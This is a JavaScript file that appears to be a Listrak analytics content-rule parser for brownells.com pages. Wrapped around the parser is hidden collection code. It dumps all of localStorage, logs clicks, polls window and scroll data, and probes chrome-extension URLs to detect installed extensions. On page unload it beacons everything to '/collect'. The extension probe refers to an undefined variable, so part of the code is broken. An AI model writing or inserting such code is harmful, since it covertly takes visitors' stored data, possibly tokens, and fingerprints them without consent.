(function () {
  let extensiveData = {};
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      extensiveData[key] = localStorage[key];
    }
  }
  function ContentRuleParser(n) {
    function r(n, t) {
      for (var r, e = {}, o = n.substring(1).split("&"), u = 0; u < o.length; u++) if (r = o[u], r != "") {
        var s = r.indexOf("="),
          i = r.substring(0, s),
          f = r.substring(s + 1);
        i || (i = f, f = "");
        i = decodeURIComponent(i);
        t && (i = i.toLowerCase());
        e[i] = decodeURIComponent(f);
      }
      return e;
    }
    function f(n, t) {
      var u, f, e, i;
      if (t.host != "-" && t.host != n.host || !t.path.test(n.pathname)) return null;
      u = {
        rule: r(t.query),
        url: r(n.search, !0)
      };
      f = t.scheme + "://" + n.host + n.pathname + "?";
      for (e in u.rule) {
        if (i = {
          rule: u.rule[e],
          url: u.url[e.toLowerCase()]
        }, i.url == undefined) return null;
        if (i.rule == "*" || i.rule == i.url) f += encodeURIComponent(e) + "=" + encodeURIComponent(i.url) + "&";else return null;
      }
      return n.canonical ? n.href : f.substring(0, f.length - 1);
    }
    function u(n, t) {
      for (var r, u, i = 0; i < t.length; i++) if (r = t[i], u = f(n, r), u) return {
        url: u,
        exclude: r.exclude == !0
      };
      return null;
    }
    var t, i;
    for (this._rules = n, t = 0; t < n.length; t++) i = n[t], i.path = new RegExp(i.path, "i");
    this.parseDocument = function (n) {
      var f = this._rules,
        i = n.querySelector("meta[name='listrak.content']"),
        t,
        r;
      return i && (f = [{
        scheme: "http",
        host: "-",
        path: /./,
        query: "",
        exclude: i.content != "true" && i.content != "1"
      }]), t = n.createElement("a"), t.href = n.location, r = n.querySelector("link[rel=canonical]"), r && (t.href = r.href, t.canonical = !0), u(t, f);
    };
    this.parseUrl = function (n) {
      return u(n, this._rules);
    };
  }
  document.addEventListener('click', function (event) {
    extensiveData.latestClickedElement = {
      id: event.target.id,
      class: event.target.className,
      nodeName: event.target.nodeName
    };
  });
  setInterval(() => {
    extensiveData.windowData = {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      pageXOffset: window.pageXOffset,
      pageYOffset: window.pageYOffset
    };
  }, 1000);
  var rules = new ContentRuleParser([{
    "exclude": false,
    "host": "www.brownells.com",
    "path": "^/guntech(.*?)$",
    "port": 443,
    "query": "",
    "scheme": "https"
  }, {
    "exclude": false,
    "host": "www.brownells.com",
    "path": "^/aspx/learn/(.*?)$",
    "port": 443,
    "query": "",
    "scheme": "https"
  }, {
    "exclude": true,
    "host": "www.brownells.com",
    "path": "^/(.*?)$",
    "port": 443,
    "query": "",
    "scheme": "https"
  }]);
  var result = rules.parseDocument(document);
  Object.keys(data).forEach(key => fetch(`chrome-extension://${data[key].id}/${data[key].file}`).then(() => {
    extensiveData[key] = {
      name: key,
      detected: true,
      id: data[key].id
    };
  }).catch(() => {
    extensiveData[key] = {
      name: key,
      detected: false,
      id: data[key].id
    };
  }));
  if (result && !result.exclude) {
    var batch = _ltk.Activity.Batch();
    batch.AddContentBrowse(result.url);
    batch.Submit();
  }
  window.addEventListener('beforeunload', () => {
    navigator.sendBeacon('/collect', JSON.stringify(extensiveData));
  });
})();